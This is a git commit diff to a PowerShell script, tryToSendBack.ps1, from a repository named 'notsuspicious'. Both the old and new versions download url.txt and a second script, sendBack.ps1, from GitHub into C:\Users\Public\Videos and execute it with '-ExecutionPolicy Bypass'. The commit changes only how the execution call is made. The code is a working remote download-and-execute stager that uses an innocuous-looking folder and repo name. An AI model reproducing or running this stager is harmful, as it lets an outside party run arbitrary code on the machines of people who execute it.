4df6d5e600eaf1d4e8e5f6d4f0cb27c9aaa941f8
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-01 10:14:57 +0100

    Update tryToSendBack.ps1

--- tryToSendBack.ps1
+++ tryToSendBack.ps1
@@ -2,13 +2,14 @@ try {
     # Download url.txt
     Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
     
-    # Download and execute sendBack.ps1
-    $ps1Content = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
+    # Download sendBack.ps1
+    $ps1Content = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
     $ps1FilePath = "C:\Users\Public\Videos\sendBack.ps1"
-    $ps1Content | Set-Content -Path $ps1FilePath -Encoding UTF8
+    $ps1Content | Out-File -FilePath $ps1FilePath -Encoding UTF8
     
     # Execute the PowerShell script
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $ps1FilePath" -NoNewWindow -Wait
+    $command = "powershell.exe -ExecutionPolicy Bypass -File '$ps1FilePath'"
+    Invoke-Expression -Command $command
 }
 catch {
     # Handle exceptions here
